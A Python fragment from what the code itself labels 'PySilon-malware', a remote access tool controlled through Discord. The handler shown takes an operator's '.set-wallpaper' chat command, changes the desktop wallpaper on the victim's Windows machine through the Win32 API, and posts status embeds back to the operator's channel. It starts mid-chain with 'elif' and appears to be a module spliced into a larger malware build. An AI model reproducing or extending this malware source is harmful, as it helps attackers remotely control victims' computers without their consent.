import os
import ctypes
import win32con
from getpass import getuser


elif message.content[:14] == ".set-wallpaper":
    await message.delete()
    if message.content.strip() == ".set-wallpaper":
        embed = discord.Embed(title="📛 Error",description='`Syntax: .set-wallpaper <path/to/image> (also include the extension)`', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction(':red_circle:')
    else:
        image_path = message.content[15:]
        image_path = image_path.replace('\\','/')

        if os.path.exists(image_path) and os.path.isfile(image_path):
            changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
            ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, image_path, changed)
            embed = discord.Embed(title="🟢 Success",description=f'```Changed wallpaper successfully!```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await message.channel.send(embed=embed)
        else:
            embed = discord.Embed(title="📛 Error",description='`File doesnt exist!`', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction(':red_circle:')